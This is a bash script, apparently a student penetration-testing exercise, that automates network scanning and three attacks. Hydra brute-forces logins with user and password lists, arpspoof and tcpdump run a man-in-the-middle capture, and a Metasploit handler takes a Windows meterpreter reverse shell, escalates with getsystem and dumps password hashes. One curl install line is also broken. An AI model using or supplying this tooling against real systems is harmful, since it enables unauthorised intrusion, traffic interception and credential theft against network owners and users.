#!/bin/bash
function instnmap()
{
#check whether nmap is installed, if not, install nmap
 CHKNMAP=$(which nmap)
	if [[ ! $CHKNMAP ]] #if no nmap, installation will be prompted
	then 
	echo 'Oops! The tool you need, nmap, is not installed.'
	read -p 'Enter Y to install nmap: ' NMAPINSTALL
		if [ "$NMAPINSTALL" == "Y" ]
		then 
		echo 'Installing nmap..'
		sudo apt install nmap
		sudo updatedb
		instnmap
		else
		echo 'You do not have nmap installed, would you like to choose another tool?'
		choosetool
		fi
	else
	echo 'Yay! nmap is installed.'
	runnmap
	fi

}

function instmasscan()
{
#check whether masscan is installed, if not, install masscan
 CHKMASSCAN=$(which masscan)
	if [[ ! $CHKMASSCAN ]] #if no masscan, installation will be prompted
	then 
	echo 'Oops! The tool you need, masscan, is not installed.'
	read -p 'Enter Y to install masscan: ' MSINSTALL
		if [ "$MSINSTALL" == "Y" ]
		then 
		echo 'Installing masscan..'
		sudo apt install masscan
		sudo updatedb
		instmasscan
		else
		echo 'You do not have masscan installed, would you like to choose another tool?'
		choosetool
		fi
	else
	echo 'Yay! masscan is installed.'
	runmasscan
	fi

}

function insthydra()
{
#check whether hydra is installed, if not, install hydra
 CHKHYDRA=$(which hydra)
	if [[ ! $CHKHYDRA ]] #if no hydra, installation will be prompted
	then 
	echo 'Oops! The tool you need, hydra, is not installed.'
	read -p 'Enter Y to install hydra: ' HYDINSTALL
		if [ "$HYDINSTALL" == "Y" ]
		then 
		echo 'Installing hydra..'
		sudo apt install hydra
		sudo updatedb
		insthydra
		else
		echo 'You do not have hydra installed, would you like to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Yay! hydra is installed.'
	runhydra
	fi

}

function instarp()
{
#check whether arpspoof is installed, if not, install arpspoof
 CHKARP=$(which arpspoof)
	if [[ ! $CHKARP ]] #if no arpspoof, installation will be prompted
	then 
	echo 'Oops! The tool you need, arpspoof, is not installed.'
	read -p 'Enter Y to install arpspoof: ' ARPINSTALL
		if [ "$ARPINSTALL" == "Y" ]
		then 
		echo 'Installing arpspoof..'
		sudo apt install dsniff
		sudo updatedb
		instarp
		else
		echo 'You do not have arpspoof installed, would you like to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Yay! arpspoof is installed.'
	runarp
	fi

}

function instmsfconsole()
{
#check whether msfconsole is installed, if not, install msfconsole
 CHKMSF=$(which msfconsole)
	if [[ ! $CHKMSF ]] #if no msfconsole, installation will be prompted
	then 
	echo 'Oops! The tool you need, msfconsole, is not installed.'
	read -p 'Enter Y to install msfconsole: ' MSFINSTALL
		if [ "$MSFINSTALL" == "Y" ]
		then 
		echo 'Installing msfconsle..' ##https://www.fosslinux.com/48112/install-metasploit-kali-linux.htm
		sudo apt install metasploit-framework
		sudo /etc/init.d/postgresql start 
		sudo /etc/init.d/postgresql status
		sudo updatedb
		curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb> msfinstall && chmod 755 && msfinstall && ./msfinstall
		sudo updatedb
		instmsfconsole
		else
		echo 'You do not have msfconsole installed, would you like to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Yay! msfconsole is installed.'
	runmsfconsole
	fi

}

#2. allow user to choose two methods of scanning and two different network attacks to run via your script e.g. nmap, masscan, msfconsole, hydra ,mitm
function choosetool()
{
	#allow the user to choose different scans between nmap and masscan
	read -p 'Please choose the tool for scanning: NMAP (N) or MASSCAN (M): ' NMorMS
	case $NMorMS in
	N) 
	instnmap
	;;
	M)
	instmasscan
	;;
	*)
	echo 'No tool chosen for scanning, exiting..'
	;;
	esac		
}

function chooseattack()
{
	#allow the user to choose different scans between nmap and masscan
	read -p 'Please choose the tool for attack: Hydra (H), Man in the Middle (MITM) or reverse payload (RP): ' ATTACK
	case $ATTACK in
	H)
	insthydra
	;;
	MITM)
	instarp
	;;
	RP)
	instmsfconsole
	;;
	*)
	echo 'No tool chose for attack, exitng..'
	;;
	esac

}
#3. log executed attacks: every scan or attack should be logged and saved with the date and used arguments

#use this function to save results such as date,time,IPs, kind of attack
function scandetails()
{
	echo '**Please give the following details for scan..'
	read -p 'Please enter the IP address to scan: ' IP
	read -p 'Please specify the port range you want to scan (e.g. -p1-1000): ' PORT
	read -p 'Please enter the file name you like to save the results in: ' FILENAME
	read -p 'Would you like to add specific flags for the scan? (e.g. -sV -sC): ' FLAGS
	
}

#use this function to run nmap
function runnmap()
{
	scandetails
	
	echo '**Running nmap and saving into greppable format..'
	sudo nmap $IP $PORT $FLAGS -oG $FILENAME 2>/dev/null
	
	echo '**Here is the nmap results:'
	cat $FILENAME
	
	read -p 'Would you like to run another nmap scan? (Y/N): ' NMAP2
	case $NMAP2 in
	Y)
	runnmap
	;;
	*)
	echo 'Completed nmap scan, proceeding to attack tool..'
	esac
}

#use this function to run masscan
function runmasscan()
{
	scandetails
	
	echo '**Running masscan and saving into..'
	sudo masscan $IP $PORT -oG $FILENAME 2>/dev/null
	echo '**Here is the masscan results:'
	cat $FILENAME
	
	read -p 'Would you like to run another masscan? (Y/N): ' MS2
	case $MS2 in
	Y)
	runmasscan
	;;
	*)
	echo 'Completed masscan, proceeding to attack tool..'
	esac
	
}
	
function runhydra()
{ 	read -p "Please enter IP to crack: " IPHYD	
	read -p "Please enter filename for hydra results: " HYDRA
	read -p "Please enter user list to crack: " USERLIST
	read -p "Please enter password list to crack: " PWLIST
	read -p "Please enter service to attack: " SERVICE
	read -p "Please enter port to attack: " PORT2
	echo "**Running Hydra for open ports" 

hydra -L $USERLIST -P $PWLIST $IPHYD -s $PORT2 $SERVICE >> $HYDRA

echo "**Here are the cracked passwords:"
cat $HYDRA | grep password:
	
}


function runarp()
{
	read -p "Please enter router ip address you want to spoof: " ROUTERIP
	read -p "Please enter User ip address you want to spoof: " USERIP
	read -p "Please enter filename to capture packets: " PKTFILE
	read -p "Please specify the duration (default in seconds, e.g. 5 = 5s, 5m =5min, 5h = 5 hours, 5d = 5 days) to capture packets: " TIME
	echo "You need to be root to be able to run MiTM, accessing root user"

sudo -i << HERE
echo "Here's your directory"
pwd
echo "**Enabling IP forward"
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "**Currently running arp spoof and capturing packets into $PKTFILE.cap.."
	timeout $TIME arpspoof -t $USERIP $ROUTERIP &
	timeout $TIME arpspoof -t $ROUTERIP $USERIP &
	timeout $TIME tcpdump -w $PKTFILE.cap
HERE
}

function runmsfconsole()
{
	echo "This will create a reverse payload for windows"
	read -p "Please enter your ip address: " ATKIP
	read -p "Please enter your port number: " ATKPORT
	read -p "Please enter the file name for payload: " ATKFILE
	read -p "Please enter file name to save log results: " RESFILE
	
	#msfvenom -p windows/meterpreter/reverse_tcp lhost=$ATKIP lport=$ATKPORT -f exe -o $ATKFILE
	
	echo "**Creating automated script for multi functions"
	echo "run post/windows/manage/migrate
	ipconfig
	sysinfo
	run post/windows/gather/enum_shares
	run post/windows/gather/checkvm
	getsystem
	run post/windows/gather/hashdump
	background" > autorun.rc
	echo "**Done! Starting msfconsole.."
	echo "spool $RESFILE
	set AutoRunScript multi_console_command -r autorun.rc
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost $ATKIP 
	set lport $ATKPORT
	run" >> runmeterpreter.rc
msfconsole -r runmeterpreter.rc
	
	
}


chooseattack
